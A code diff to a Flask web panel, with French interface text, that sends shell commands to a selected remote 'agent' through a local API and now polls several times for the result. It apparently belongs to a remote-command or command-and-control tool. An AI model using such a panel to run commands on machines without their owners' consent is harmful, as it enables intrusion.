@@ -1,5 +1,5 @@
 from flask import Flask, render_template, request, redirect, session
-import requests
+import requests, time
 
 API_URL= "http://127.0.0.1:5000"
 
@@ -77,11 +77,27 @@ def terminal():
                     json={"agent_id": selected_agent_id, "command": cmd}
                 )
                 data = res.json()
-                result = f"Commande envoyée à {selected_agent_id} (id: {data.get('id')})"
+
+                command_id = data.get('id')
+                result = f"Commande envoyée à {selected_agent_id} (id: {command_id})"
+                print(result)
+
+                for _ in range(5):
+                    res = requests.get(f"{API_URL}/agent/result", json={"command_id": command_id}).json()
+                    result = res["result"]
+
+                    print(f"result is {res}")
+
+                    #if result != "Aucun résultat disponible":
+                    #    break
+
+                    time.sleep(0.5)
+
             except:
                 result = f"Impossible de joindre l'API pour {selected_agent_id}"
         else:
             result = "Aucun agent disponible"
+
 
         session["history"].append(f"[{selected_agent_id}] $ {cmd}\n{result}")
         session["history"] = session["history"][-15:]
